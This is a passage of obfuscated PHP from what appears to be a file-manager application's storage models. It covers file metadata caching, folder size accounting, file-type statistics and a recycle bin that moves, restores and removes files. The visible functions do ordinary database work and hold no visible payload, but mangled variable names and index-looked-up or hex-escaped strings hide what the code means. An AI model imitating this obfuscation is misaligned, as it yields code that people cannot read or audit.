Pinyin::get($ÒıÌîâã)); $çêÖşË¿[$ÎÈ¦±öÒ[464]] = Pinyin::get($ÒıÌîâã, $ÎÈ¦±öÒ[594]); } if (!$˜’÷ŠÌ  && !$šÀ×ÀÅµ) { $çêÖşË¿[$ÎÈ¦±öÒ[465]] = null; $çêÖşË¿[$ÎÈ¦±öÒ[464]] = null; } $this->metaSet($€îœë”ß, $çêÖşË¿); } public function getContent($ì§Î´¾) { $ê›µ¯Á =& $_SERVER[ßğøİ]; $à¸ŞÈÕ = $this->fileInfoGet($ì§Î´¾); if (!$à¸ŞÈÕ) { return !1; } if ($à¸ŞÈÕ[$ê›µ¯Á[76]] == 0) { return $ê›µ¯Á[12]; } $Óå¾ñî£ = $ê›µ¯Á[2124] . $à¸ŞÈÕ[$ê›µ¯Á[176]]; if ($à¸ŞÈÕ[$ê›µ¯Á[76]] <= 1024 * 10) { $Ş°Ï¢À = Cache::get($Óå¾ñî£); if (!$Ş°Ï¢À) { $Ş°Ï¢À = IO::getContent($à¸ŞÈÕ[$ê›µ¯Á[84]]); Cache::set($Óå¾ñî£, $Ş°Ï¢À); } return $Ş°Ï¢À; } if (!$à¸ŞÈÕ[$ê›µ¯Á[84]]) { return $ê›µ¯Á[12]; } return IO::getContent($à¸ŞÈÕ[$ê›µ¯Á[84]]); } public function setDesc($âÏºÛŞ, $Ö…¬ñª) { $‡Äæ¸ëŒ =& $_SERVER[ßğøİ]; Model($‡Äæ¸ëŒ[570])->eventAddDesc($âÏºÛŞ, $Ö…¬ñª); return $this->metaSet($âÏºÛŞ, $‡Äæ¸ëŒ[453], $Ö…¬ñª); } public function setContent($öù×ÉøË, $½ˆ†Éôß = '') { $ÀĞØİÎ =& $_SERVER[ßğøİ]; $Äúìòö = $this->sourceInfo($öù×ÉøË); $³³©¼É” = $this->fileInfoGet($öù×ÉøË); if (!$³³©¼É” || !$Äúìòö) { return !1; } $íÚñµé÷ = Model($ÀĞØİÎ[471])->addFileByContent($½ˆ†Éôß, $Äúìòö[$ÀĞØİÎ[32]]); $è‘Å½Õ² = $this->fileHistory($Äúìòö, $íÚñµé÷[$ÀĞØİÎ[468]], $íÚñµé÷[$ÀĞØİÎ[76]]); if (!$è‘Å½Õ²) { return Model($ÀĞØİÎ[471])->remove($íÚñµé÷[$ÀĞØİÎ[468]]); } $this->folderSizeReset($Äúìòö[$ÀĞØİÎ[432]]); return !0; } public function fileSubstr($ˆ¨ªÅ, $™›Õ¬äà, $‰Ê€ÑÀ¾) { $Í¬¼ü»ˆ = $this->fileInfoGet($ˆ¨ªÅ); if (!$Í¬¼ü»ˆ) { return !1; } return IO::fileSubstr($Í¬¼ü»ˆ[$_SERVER[ßğøİ][84]], $™›Õ¬äà, $‰Ê€ÑÀ¾); } public function fileInfoGet($Öü Š©í) { $Š€ Ãê =& $_SERVER[ßğøİ]; $ç°×úæ½ = $this->sourceInfo($Öü Š©í); if (!$ç°×úæ½ || $ç°×úæ½[$Š€ Ãê[410]]) { return !1; } $³ì»—½Ó = $Š€ Ãê[474] . $ç°×úæ½[$Š€ Ãê[468]]; $¶´¯¼« = _get(self::$cacheFileInfo, $³ì»—½Ó); if ($¶´¯¼«) { return $¶´¯¼«; } $û±ÅÛõ = Model($Š€ Ãê[471])->fileInfo($ç°×úæ½[$Š€ Ãê[468]]); if ($û±ÅÛõ) { $û±ÅÛõ[$Š€ Ãê[32]] = $ç°×úæ½[$Š€ Ãê[32]]; } self::$cacheFileInfo[$³ì»—½Ó] = $û±ÅÛõ; return $û±ÅÛõ; } private function folderChildrenNumber($âÁÄŠ) { $ù¡¶¶²» =& $_SERVER[ßğøİ]; $ıÈÕ§Ç™ = $this->sourceInfo($âÁÄŠ); $¾¸Šƒò = array($ù¡¶¶²»[590] => array($ù¡¶¶²»[550], $ıÈÕ§Ç™[$ù¡¶¶²»[521]] . $âÁÄŠ . $ù¡¶¶²»[551]), $ù¡¶¶²»[587] => $ıÈÕ§Ç™[$ù¡¶¶²»[505]], $ù¡¶¶²»[430] => intval($ıÈÕ§Ç™[$ù¡¶¶²»[431]]), $ù¡¶¶²»[583] => 1); $Í÷ £ª© = $this->where($¾¸Šƒò)->count(); $™„¨»“ = $this->where($¾¸Šƒò)->where(array($ù¡¶¶²»[583] => 0))->count(); return array($ù¡¶¶²»[80] => $™„¨»“, $ù¡¶¶²»[81] => $Í÷ £ª©); } public function pathInfo($âÂ£õ²ª, $ØàìÎ‰³ = false) { $ÑçÇş»² =& $_SERVER[ßğøİ]; $ØàìÎ‰³ = !1; $âÂ£õ²ª = intval($âÂ£õ²ª); $¬¦»õÉÍ = $ÑçÇş»²[461] . intval($ØàìÎ‰³) . $ÑçÇş»²[386] . $âÂ£õ²ª; $×—Äº‰æ = _get(self::$cachePathInfo, $¬¦»õÉÍ); if ($×—Äº‰æ) { return $×—Äº‰æ; } $àÊã¹œÙ = $this->sourceInfo($âÂ£õ²ª); if (!$àÊã¹œÙ) { return !1; } $àÊã¹œÙ = $this->_listDataApplyItem($àÊã¹œÙ, $ØàìÎ‰³); self::$cachePathInfo[$¬¦»õÉÍ] = $àÊã¹œÙ; return $àÊã¹œÙ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ã¿îÎè¦) { $Ñ£µøÃÇ =& $_SERVER[ßğøİ]; $İÜÓğÕÂ = _get(self::$cachePathInfoMore, $Ã¿îÎè¦); if ($İÜÓğÕÂ) { return $İÜÓğÕÂ; } $ÇºëÕ­ = $this->pathInfo($Ã¿îÎè¦); if (!$ÇºëÕ­) { return !1; } if ($ÇºëÕ­[$Ñ£µøÃÇ[410]] == $Ñ£µøÃÇ[88]) { $ÇºëÕ­[$Ñ£µøÃÇ[79]] = $this->folderChildrenNumber($Ã¿îÎè¦); } self::$cachePathInfoMore[$Ã¿îÎè¦] = $ÇºëÕ­; return $ÇºëÕ­; } public function sourceInfo($­êµå“) { $€³«Ğè© =& $_SERVER[ßğøİ]; if (!$­êµå“) { return array(); } $­êµå“ = intval($­êµå“); $¦“Ô„Ğí = $€³«Ğè©[460] . $­êµå“; $şêñ–Ìˆ = _get(self::$cacheSourceInfo, $¦“Ô„Ğí); if ($şêñ–Ìˆ) { return $şêñ–Ìˆ; } $ñ­´¡©ä = $this->where(array($€³«Ğè©[402] => $­êµå“))->find(); self::$cacheSourceInfo[$¦“Ô„Ğí] = $ñ­´¡©ä; return self::$cacheSourceInfo[$¦“Ô„Ğí]; } public function sourceCacheClear($¬¥¢ËõĞ = false) { self::cacheClear($¬¥¢ËõĞ); } public static function cacheClear($‹éÍä¢ğ = false) { $¸Ûİ‘ı =& $_SERVER[ßğøİ]; if ($‹éÍä¢ğ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¸Ûİ‘ı[460] . $‹éÍä¢ğ]); unset(self::$cachePathInfoMore[$‹éÍä¢ğ]); unset(self::$cachePathInfo[$¸Ûİ‘ı[2125] . $‹éÍä¢ğ]); unset(self::$cachePathInfo[$¸Ûİ‘ı[2126] . $‹éÍä¢ğ]); } public function metaSet($êİ¢ƒñ¨, $£È†¿Ï = null, $†Ø¬…ûò = null) { $ˆÔË‹±Â = parent::metaSet($êİ¢ƒñ¨, $£È†¿Ï, $†Ø¬…ûò); if ($ˆÔË‹±Â) { $this->sourceCacheClear($êİ¢ƒñ¨); } return $ˆÔË‹±Â; } public function pathInfoByPath($ˆÃ·ÉÊŸ, $ÄÁîô½“) { $Ò±ˆ„Š³ =& $_SERVER[ßğøİ]; $ç—ä¸›Ã = !$ÄÁîô½“ ? array() : explode($Ò±ˆ„Š³[8], trim($ÄÁîô½“, $Ò±ˆ„Š³[8])); $ã•Ûòƒ÷ = $ˆÃ·ÉÊŸ; foreach ($ç—ä¸›Ã as $à·ºÀ¯é) { $ˆ¦Àıõ = array($Ò±ˆ„Š³[432] => $ã•Ûòƒ÷, $Ò±ˆ„Š³[32] => $à·ºÀ¯é); $ÓÚÀ™å¡ = $this->where($ˆ¦Àıõ)->select(); if (!$ÓÚÀ™å¡) { return !1; } $ÓÚÀ™å¡ = array_sort_by($ÓÚÀ™å¡, $Ò±ˆ„Š³[431]); $ã•Ûòƒ÷ = $ÓÚÀ™å¡[0][$Ò±ˆ„Š³[402]]; } return $this->pathInfo($ã•Ûòƒ÷, !0); } protected function updateModifyTime($ØÉÁş§ç) { $¶Çİ® =& $_SERVER[ßğøİ]; $­Ò¦“ä¡ = defined($¶Çİ®[475]) ? USER_ID : $¶Çİ®[197]; if (!$ØÉÁş§ç) { return; } if (!is_array($ØÉÁş§ç)) { $ØÉÁş§ç = array($ØÉÁş§ç); } foreach ($ØÉÁş§ç as $ğ¸Çª => $áí…éà) { $ØÉÁş§ç[$ğ¸Çª] = intval($áí…éà); $this->sourceCacheClear($áí…éà); } $Ş“ğŞ½¤ = array($¶Çİ®[402] => array($¶Çİ®[7], $ØÉÁş§ç)); $Í¹¿ôëë = array($¶Çİ®[589] => $­Ò¦“ä¡, $¶Çİ®[424] => time()); $this->where($Ş“ğŞ½¤)->save($Í¹¿ôëë); } public function folderSizeReset($…ì üø¯, $¯š¶‘­ = false) { $ÖÇÌà”± =& $_SERVER[ßğøİ]; if ($this->statusIgnoreResetSpace) { return; } $æËšâÈ’ = $this->sourceInfo($…ì üø¯); $çªŞ¼Ã² = $ÖÇÌà”±[2127] . $…ì üø¯; CacheLock::lock($çªŞ¼Ã², 20); if ($¯š¶‘­ === !1) { $this->sourceCacheClear($…ì üø¯); $æËšâÈ’ = $this->sourceInfo($…ì üø¯); $¿å«ÁÁ = array($ÖÇÌà”±[401] => $…ì üø¯, $ÖÇÌà”±[430] => 0); $ÂÏ‚¼Õ = $this->where($¿å«ÁÁ)->sum($ÖÇÌà”±[76]); $¯š¶‘­ = intval($ÂÏ‚¼Õ) - intval($æËšâÈ’[$ÖÇÌà”±[76]]); } if ($¯š¶‘­ == 0) { return CacheLock::unlock($çªŞ¼Ã²); } $ÉÚø¶¡ = $this->parentLevelArray($æËšâÈ’[$ÖÇÌà”±[521]]); if (!$ÉÚø¶¡) { $ÉÚø¶¡ = array(); } $ÉÚø¶¡[] = $æËšâÈ’[$ÖÇÌà”±[402]]; $¿å«ÁÁ = array($ÖÇÌà”±[402] => array($ÖÇÌà”±[418], $ÉÚø¶¡)); if ($¯š¶‘­ < 0) { $¿å«ÁÁ[$ÖÇÌà”±[76]] = array($ÖÇÌà”±[1015], abs($¯š¶‘­)); } $this->where($¿å«ÁÁ)->setAdd($ÖÇÌà”±[76], $¯š¶‘­); CacheLock::unlock($çªŞ¼Ã²); $¨ôşÓ„ = $ÖÇÌà”±[2128] . $æËšâÈ’[$ÖÇÌà”±[411]] . $ÖÇÌà”±[4] . $æËšâÈ’[$ÖÇÌà”±[505]]; $ş‚æøÎæ = array($æËšâÈ’[$ÖÇÌà”±[411]], $æËšâÈ’[$ÖÇÌà”±[505]]); TaskRun::timeLimitCall($¨ôşÓ„, $ÖÇÌà”±[2129], $ş‚æøÎæ, 1.5); } public function folderSizeResetChildren($Ø¹§˜á) { $’û“çÚâ =& $_SERVER[ßğøİ]; $this->sourceCacheClear($Ø¹§˜á); $šû¶Ãí¶ = $this->sourceInfo($Ø¹§˜á); $Îº‡–À  = array($’û“çÚâ[583] => 1, $’û“çÚâ[587] => $šû¶Ãí¶[$’û“çÚâ[505]], $’û“çÚâ[590] => array($’û“çÚâ[550], $šû¶Ãí¶[$’û“çÚâ[521]] . $Ø¹§˜á . $’û“çÚâ[551])); $åÒÈäêë = $’û“çÚâ[2130]; $åÕ³éÆ£ = $this->field($åÒÈäêë)->where($Îº‡–À )->select(); $Îº‡–À [$’û“çÚâ[410]] = 0; $Â›¬ßä´ = $this->field($åÒÈäêë)->where($Îº‡–À )->select(); if (!$Â›¬ßä´) { return; } $åÕ³éÆ£[] = $šû¶Ãí¶; $åÕ³éÆ£ = array_to_keyvalue($åÕ³éÆ£, $’û“çÚâ[402]); foreach ($åÕ³éÆ£ as $Œ—ÆºËµ => $ğÅ†È´) { $åÕ³éÆ£[$Œ—ÆºËµ][$’û“çÚâ[2131]] = $åÕ³éÆ£[$Œ—ÆºËµ][$’û“çÚâ[76]]; $åÕ³éÆ£[$Œ—ÆºËµ][$’û“çÚâ[76]] = 0; } foreach ($Â›¬ßä´ as $ğÅ†È´) { $•ƒ»ĞØÇ = $ğÅ†È´[$’û“çÚâ[432]] . $’û“çÚâ[12]; if (!isset($åÕ³éÆ£[$•ƒ»ĞØÇ])) { continue; } if ($ğÅ†È´[$’û“çÚâ[431]] == $åÕ³éÆ£[$•ƒ»ĞØÇ][$’û“çÚâ[431]]) { $åÕ³éÆ£[$•ƒ»ĞØÇ][$’û“çÚâ[76]] += $ğÅ†È´[$’û“çÚâ[76]]; } } foreach ($åÕ³éÆ£ as $ğÅ†È´) { $šÁñùÉ‚ = $this->parentLevelArray($ğÅ†È´[$’û“çÚâ[521]]); foreach ($šÁñùÉ‚ as $•ƒ»ĞØÇ) { $•ƒ»ĞØÇ = $•ƒ»ĞØÇ . $’û“çÚâ[12]; if (!isset($åÕ³éÆ£[$•ƒ»ĞØÇ])) { continue; } if ($ğÅ†È´[$’û“çÚâ[431]] == $åÕ³éÆ£[$•ƒ»ĞØÇ][$’û“çÚâ[431]]) { $åÕ³éÆ£[$•ƒ»ĞØÇ][$’û“çÚâ[76]] += $ğÅ†È´[$’û“çÚâ[76]]; } } } $ë Ç¿ğé = array(); foreach ($åÕ³éÆ£ as $ğÅ†È´) { if ($ğÅ†È´[$’û“çÚâ[76]] == $ğÅ†È´[$’û“çÚâ[2131]]) { continue; } $ë Ç¿ğé[] = array($’û“çÚâ[402], $ğÅ†È´[$’û“çÚâ[402]], $’û“çÚâ[76], $ğÅ†È´[$’û“çÚâ[76]]); } $this->saveAll($ë Ç¿ğé); } public function userSpaceReset($©ı»¤ôÛ = false) { $ƒáåûŸ† =& $_SERVER[ßğøİ]; $Î’–§°î = $this->where(array($ƒáåûŸ†[411] => self::TYPE_USER, $ƒáåûŸ†[505] => $©ı»¤ôÛ, $ƒáåûŸ†[410] => 0))->sum($ƒáåûŸ†[76]); $Î’–§°î = !$Î’–§°î || $Î’–§°î <= 0 ? 0 : $Î’–§°î; Model($ƒáåûŸ†[513])->userEdit($©ı»¤ôÛ, array($ƒáåûŸ†[1817] => $Î’–§°î)); } public function targetSpaceUpdate($¿¹¿İ°€, $“îÚª¸) { $“°°·Ä¦ =& $_SERVER[ßğøİ]; if (!$“îÚª¸) { return; } if (!in_array($¿¹¿İ°€, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $›ı  = $this->targetSpaceSize($¿¹¿İ°€, $“îÚª¸); if ($¿¹¿İ°€ == self::TYPE_USER) { Model($“°°·Ä¦[513])->userEdit($“îÚª¸, array($“°°·Ä¦[1817] => $›ı )); } else { if ($¿¹¿İ°€ == self::TYPE_GROUP) { Model($“°°·Ä¦[522])->groupEdit($“îÚª¸, array($“°°·Ä¦[1817] => $›ı )); } } } public function targetSpaceSize($å’°²Ÿ, $¿ê›¬ğ) { $óËóôùæ =& $_SERVER[ßğøİ]; $ÈŒÙ‡ãŒ = 0; $Šüè©» = $this->sourceRoot($å’°²Ÿ, $¿ê›¬ğ, !0); foreach ($Šüè©» as $÷ÑÂÎ ò) { if (!$÷ÑÂÎ ò) { continue; } $ÈŒÙ‡ãŒ += floatval($÷ÑÂÎ ò[$óËóôùæ[76]]); $šê½ãš = array($óËóôùæ[590] => array($óËóôùæ[550], $óËóôùæ[531] . $÷ÑÂÎ ò[$óËóôùæ[402]] . $óËóôùæ[551])); $ÁÅÓÌÙ“ = Model($óËóôùæ[429])->field($óËóôùæ[417])->where($šê½ãš)->select(); $ÁÅÓÌÙ“ = array_to_keyvalue($ÁÅÓÌÙ“, $óËóôùæ[12], $óËóôùæ[402]); $ÁÅÓÌÙ“ = array_unique(array_filter($ÁÅÓÌÙ“)); if ($ÁÅÓÌÙ“) { $šê½ãš = array($óËóôùæ[417] => array($óËóôùæ[418], $ÁÅÓÌÙ“)); $ÈŒÙ‡ãŒ += floatval($this->where($šê½ãš)->sum($óËóôùæ[76])); } } $ÈŒÙ‡ãŒ = !$ÈŒÙ‡ãŒ || $ÈŒÙ‡ãŒ <= 0 ? 0 : $ÈŒÙ‡ãŒ; return $ÈŒÙ‡ãŒ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($óæŠãé¦) { return $this->fileTypeProfile($óæŠãé¦, SourceModel::TYPE_USER); } public function groupFileTypeProfile($£Ï×ñÅ‰) { return $this->fileTypeProfile($£Ï×ñÅ‰, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ŠÆˆˆï, $†ØË‰×¦) { $‡ãÔ•Ùï =& $_SERVER[ßğøİ]; $¶¼üÎË = $‡ãÔ•Ùï[2132] . $ŠÆˆˆï . $‡ãÔ•Ùï[11] . $†ØË‰×¦; $ÒÚ×Õª = Cache::get($¶¼üÎË); if ($ÒÚ×Õª) { return $ÒÚ×Õª; } $ä¶±« = array($‡ãÔ•Ùï[583] => 0); if ($ŠÆˆˆï != !1) { $ä¶±«[$‡ãÔ•Ùï[505]] = $ŠÆˆˆï; $ä¶±«[$‡ãÔ•Ùï[411]] = $†ØË‰×¦; } $¶¹è­˜° = array(); $¶¹è­˜°[$‡ãÔ•Ùï[2133]] = array($‡ãÔ•Ùï[2134] => LNG($‡ãÔ•Ùï[2133]), $‡ãÔ•Ùï[2135] => $this->where($ä¶±«)->count(), $‡ãÔ•Ùï[585] => $this->where($ä¶±«)->sum($‡ãÔ•Ùï[76])); $üÓ²á£‡ = KodIO::fileTypeList(); foreach ($üÓ²á£‡ as $ŞÕÍ””À => $­®ñşÙ») { $ä¶±«[$‡ãÔ•Ùï[412]] = $this->fileTypeWhere($ŞÕÍ””À); $¶¹è­˜°[$ŞÕÍ””À] = array($‡ãÔ•Ùï[2134] => $­®ñşÙ»[$‡ãÔ•Ùï[32]], $‡ãÔ•Ùï[2135] => $this->where($ä¶±«)->count(), $‡ãÔ•Ùï[585] => $this->where($ä¶±«)->sum($‡ãÔ•Ùï[76])); } Cache::set($¶¼üÎË, $¶¹è­˜°, 1200); return $¶¹è­˜°; } public function fileNameExist($“Ë©Ñ¦, $öäÁ§Ù) { $®˜Ë¬¬ =& $_SERVER[ßğøİ]; $ØŠõí«æ = $this->where(array($®˜Ë¬¬[432] => $“Ë©Ñ¦, $®˜Ë¬¬[32] => $öäÁ§Ù, $®˜Ë¬¬[431] => 0))->find(); return is_array($ØŠõí«æ) ? $ØŠõí«æ[$®˜Ë¬¬[402]] : !1; } public function childList($±Ñïë) { $‹»û¡ñš =& $_SERVER[ßğøİ]; $ëÕÑğ³Ó = $‹»û¡ñš[2110] . $±Ñïë; if (isset(self::$cacheChildList[$ëÕÑğ³Ó])) { return self::$cacheChildList[$ëÕÑğ³Ó]; } $ô æ = array($‹»û¡ñš[432] => intval($±Ñïë), $‹»û¡ñš[431] => 0); $öÔÚ¨à± = $this->where($ô æ)->select(); $öÔÚ¨à± = $öÔÚ¨à± ? $öÔÚ¨à± : array(); self::$cacheChildList[$ëÕÑğ³Ó] = $öÔÚ¨à±; foreach ($öÔÚ¨à± as $®ìÍöËû) { $ëÕÑğ³Ó = $‹»û¡ñš[460] . $®ìÍöËû[$‹»û¡ñš[402]]; self::$cacheSourceInfo[$ëÕÑğ³Ó] = $®ìÍöËû; } return $öÔÚ¨à±; } public function fileNameAuto($’ÆöŸÁª, $ùú­ˆ±, $ñè‹’éö = REPEAT_RENAME, $Ùàáş×´ = false) { $ä¢µİ­¯ =& $_SERVER[ßğøİ]; $Åùù•ïË = get_path_ext($ùú­ˆ±); $ãè¶­éš = $Åùù•ïË ? basename($ùú­ˆ±, $ä¢µİ­¯[10] . $Åùù•ïË) . $ä¢µİ­¯[2136] . $Åùù•ïË : $ùú­ˆ± . $ä¢µİ­¯[384]; $Òïµ’üş = array($ä¢µİ­¯[432] => $’ÆöŸÁª, $ä¢µİ­¯[431] => 0, $ä¢µİ­¯[32] => array($ä¢µİ­¯[383], $ãè¶­éš)); $¨Ûú¨›Š = $this->field($ä¢µİ­¯[32])->where($Òïµ’üş)->select(); $êæ¥Ìäş = array_to_keyvalue($¨Ûú¨›Š, $ä¢µİ­¯[12], $ä¢µİ­¯[32]); return $this->fileNameAutoGet($êæ¥Ìäş, $ùú­ˆ±, $ñè‹’éö, $Ùàáş×´); } public function fileNameAutoGet($éÁ»öœÌ, $§¬¤¨İ÷, $¢Åì™Ç, $³Ä½˜Íà) { $ß£¿ìÍ‚ =& $_SERVER[ßğøİ]; if ($¢Åì™Ç == REPEAT_REPLACE || !$éÁ»öœÌ || !in_array_not_case($§¬¤¨İ÷, $éÁ»öœÌ) || $³Ä½˜Íà && $¢Åì™Ç != REPEAT_RENAME_FOLDER) { return $§¬¤¨İ÷; } if ($¢Åì™Ç == REPEAT_SKIP) { return !1; } $àèñÉúä = $ß£¿ìÍ‚[10] . get_path_ext($§¬¤¨İ÷); $àèñÉúä = $àèñÉúä == $ß£¿ìÍ‚[10] || $³Ä½˜Íà ? $ß£¿ìÍ‚[12] : $àèñÉúä; for ($è–—ËŒÍ = 1; $è–—ËŒÍ <= count($éÁ»öœÌ) + 1; $è–—ËŒÍ++) { $Ïİª¡Õ¡ = substr($§¬¤¨İ÷, 0, strlen($§¬¤¨İ÷) - strlen($àèñÉúä)); $Úí‰”Åñ = $Ïİª¡Õ¡ . "\50{$è–—ËŒÍ}\x29{$àèñÉúä}"; if (!in_array_not_case($Úí‰”Åñ, $éÁ»öœÌ)) { return $Úí‰”Åñ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\162\143\x65\x5f\x72\145\143\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\151\x6d\145", "\x74\x69\x6d\145", "\151\x6e\x73\145\162\164", "\146\x75\156\x63\164\151\157\x6e")); public function listData($ñ¼›ÉÈ = false) { $ãùÑ”‹ñ =& $_SERVER[ßğøİ]; $ñ¼›ÉÈ = $ñ¼›ÉÈ ? $ñ¼›ÉÈ : USER_ID; $À“½üÉà = $this->where(array($ãùÑ”‹ñ[1646] => $ñ¼›ÉÈ))->select(); return array_to_keyvalue($À“½üÉà, $ãùÑ”‹ñ[12], $ãùÑ”‹ñ[402]); } public function moveToRecycle($Œû›š‘) { $ÓúÑ˜é¸ =& $_SERVER[ßğøİ]; $‹Àß·ò× = Model($ÓúÑ˜é¸[1327]); $ó×‚êÑ = $‹Àß·ò×->sourceInfo($Œû›š‘); if (!$ó×‚êÑ || $ó×‚êÑ[$ÓúÑ˜é¸[431]] == $ÓúÑ˜é¸[88]) { return; } $Ş±ƒÍ = array($ÓúÑ˜é¸[417] => $Œû›š‘, $ÓúÑ˜é¸[1646] => USER_ID, $ÓúÑ˜é¸[586] => $ó×‚êÑ[$ÓúÑ˜é¸[411]], $ÓúÑ˜é¸[587] => $ó×‚êÑ[$ÓúÑ˜é¸[505]], $ÓúÑ˜é¸[590] => $ó×‚êÑ[$ÓúÑ˜é¸[521]]); $this->add($Ş±ƒÍ); $this->recycleMove($Œû›š‘, 1); if ($ó×‚êÑ[$ÓúÑ˜é¸[410]] == $ÓúÑ˜é¸[88]) { $Ù½…î© = array($ÓúÑ˜é¸[590] => array($ÓúÑ˜é¸[550], $ó×‚êÑ[$ÓúÑ˜é¸[521]] . $Œû›š‘ . $ÓúÑ˜é¸[551])); $‹Àß·ò×->where($Ù½…î©)->setField($ÓúÑ˜é¸[431], 1); } } public function clear() { $this->remove(!1); } public function remove($ÄÎâçå± = false, $àÚƒ — = false) { $»ŒÓ´Şğ =& $_SERVER[ßğøİ]; $àÚƒ — = $àÚƒ — ? $àÚƒ — : USER_ID; $èÈÙƒ§ = Model($»ŒÓ´Şğ[1327]); $İşÏ›ö = $this->listData($àÚƒ —); $ÄÎâçå± = $ÄÎâçå± === !1 ? !1 : $ÄÎâçå±; $–‡ğ²­ä = array(); foreach ($İşÏ›ö as $ÇÍãÓï³) { if ($ÄÎâçå± != !1 && !in_array($ÇÍãÓï³, $ÄÎâçå±)) { continue; } $è›”ŠÑ = $èÈÙƒ§->sourceInfo($ÇÍãÓï³); $èÈÙƒ§->remove($ÇÍãÓï³, !1); $Å«Éå = $è›”ŠÑ[$»ŒÓ´Şğ[411]] . $»ŒÓ´Şğ[11] . $è›”ŠÑ[$»ŒÓ´Şğ[505]]; $–‡ğ²­ä[$Å«Éå] = array($»ŒÓ´Şğ[586] => $è›”ŠÑ[$»ŒÓ´Şğ[411]], $»ŒÓ´Şğ[505] => $è›”ŠÑ[$»ŒÓ´Şğ[505]]); $this->where(array($»ŒÓ´Şğ[402] => $ÇÍãÓï³))->delete(); } foreach ($–‡ğ²­ä as $ğ–”Ä¼ó) { $èÈÙƒ§->targetSpaceUpdate($ğ–”Ä¼ó[$»ŒÓ´Şğ[411]], $ğ–”Ä¼ó[$»ŒÓ´Şğ[505]]); } } public function restore($ìß§Íû  = false) { $ÚŞ–Ë·½ = $this->listData(); $this->_restoreSource($ÚŞ–Ë·½, $ìß§Íû ); } public function removeUserAll($ÏÍÏŸÉ¬) { $this->remove(!1, $ÏÍÏŸÉ¬); } private function _restoreSource($×½÷îü¤, $Í—›©ó›) { $®Ñòé§´ =& $_SERVER[ßğøİ]; $×ÆÈ÷´ = Model($®Ñòé§´[1327]); $Í—›©ó› = $Í—›©ó› == !1 ? !1 : $Í—›©ó›; if (!$×½÷îü¤) { return !0; } $õï¶ôüş = array(); foreach ($×½÷îü¤ as $‚†Øé¸ü) { if ($Í—›©ó› != !1 && !in_array($‚†Øé¸ü, $Í—›©ó›)) { continue; } $·£™àÍ = $×ÆÈ÷´->sourceInfo($‚†Øé¸ü); $˜ıò¯ = $×ÆÈ÷´->sourceInfo($·£™àÍ[$®Ñòé§´[432]]); if ($˜ıò¯[$®Ñòé§´[431]] == $®Ñòé§´[88]) { continue; } $×ÆÈ÷´->lockMoveStart($‚†Øé¸ü); $this->recycleMove($‚†Øé¸ü, 0); if ($·£™àÍ[$®Ñòé§´[410]] == $®Ñòé§´[88]) { $æÏ¡×Äç = array($®Ñòé§´[590] => array($®Ñòé§´[550], $·£™àÍ[$®Ñòé§´[521]] . $‚†Øé¸ü . $®Ñòé§´[551])); $×ÆÈ÷´->where($æÏ¡×Äç)->setField($®Ñòé§´[431], 0); $this->restoreFolderChildren($‚†Øé¸ü, $×½÷îü¤); } $this->where(array($®Ñòé§´[402] => $‚†Øé¸ü))->delete(); $×ÆÈ÷´->folderSizeReset($·£™àÍ[$®Ñòé§´[432]]); $õï¶ôüş[] = $·£™àÍ[$®Ñòé§´[432]]; if ($·£™àÍ[$®Ñòé§´[410]] == $®Ñòé§´[88]) { $õï¶ôüş[] = $‚†Øé¸ü; } $×ÆÈ÷´->lockMoveEnd($‚†Øé¸ü); } $×ÆÈ÷´->updateModifyTime($õï¶ôüş); } private function restoreFolderChildren($¬ÀßÅÖŠ, $øıËöÇ¢) { $öƒÌáì =& $_SERVER[ßğøİ]; $ôúëÈ×ƒ = Model($öƒÌáì[1327]); $êŸòŸ‰ç = array($öƒÌáì[402] => array($öƒÌáì[7], array())); foreach ($øıËöÇ¢ as $–ìÙïóù) { if ($–ìÙïóù == $¬ÀßÅÖŠ) { continue; } if (!$ôúëÈ×ƒ->isParentOf($¬ÀßÅÖŠ, $–ìÙïóù)) { continue; } $˜§ èı = $ôúëÈ×ƒ->sourceInfo($–ìÙïóù); if ($˜§ èı[$öƒÌáì[410]] == $öƒÌáì[88]) { $êŸòŸ‰ç[] = array($öƒÌáì[590] => array($öƒÌáì[550], $˜§ èı[$öƒÌáì[521]] . $–ìÙïóù . $öƒÌáì[551])); } else { $êŸòŸ‰ç[$öƒÌáì[402]][1][] = $–ìÙïóù; } } if (!$êŸòŸ‰ç[$öƒÌáì[402]][1]) { unset($êŸòŸ‰ç[$öƒÌáì[402]]); } if (!$êŸòŸ‰ç) { return; } $êŸòŸ‰ç[$öƒÌáì[402]][1] = array_unique($êŸòŸ‰ç[$öƒÌáì[402]][1]); $êŸòŸ‰ç[$öƒÌáì[1000]] = $öƒÌáì[1926]; $ôúëÈ×ƒ->where($êŸòŸ‰ç)->setField($öƒÌáì[431], 1); } private function recycleMove($×Ä èÆÆ, $‰À×ûº† = 1) { $ìè­—Ñş =& $_SERVER[ßğøİ]; $‹ù÷Ğœ = Model($ìè­—Ñş[1327]); $ëÑ«Ğ´  = Model($ìè­—Ñş[2137]); $Š®Ë…¶ = array($ìè­—Ñş[402] => $×Ä èÆÆ); if ($‰À×ûº†) { $‹ù÷Ğœ->where($Š®Ë…¶)->setField($ìè­—Ñş[431], 1); $ëÑ«Ğ´ ->eventRecycle($×Ä èÆÆ, $ìè­—Ñş[2138]); } else { $çê‘ßšá = $‹ù÷Ğœ->where($Š®Ë…¶)->find(); $˜´ÔÔä¶ = $çê‘ßšá[$ìè­—Ñş[410]] == $ìè­—Ñş[88]; $â‚“Õ‡Ø = $‹ù÷Ğœ->fileNameAuto($çê‘ßšá[$ìè­—Ñş[432]], $çê‘ßšá[$ìè­—Ñş[32]], REPEAT_RENAME_FOLDER, $˜´ÔÔä¶); if ($â‚“Õ‡Ø != $çê‘ßšá[$ìè­—Ñş[32]]) { $‹ù÷Ğœ->rename($×Ä èÆÆ, $â‚“Õ‡Ø); } $‹ù÷Ğœ->where($Š®Ë…¶)->setField($ìè­—Ñş[431], 0); $ëÑ«Ğ´ ->eventRecycle($×Ä èÆÆ, $ìè­—Ñş[2139]); } } } class 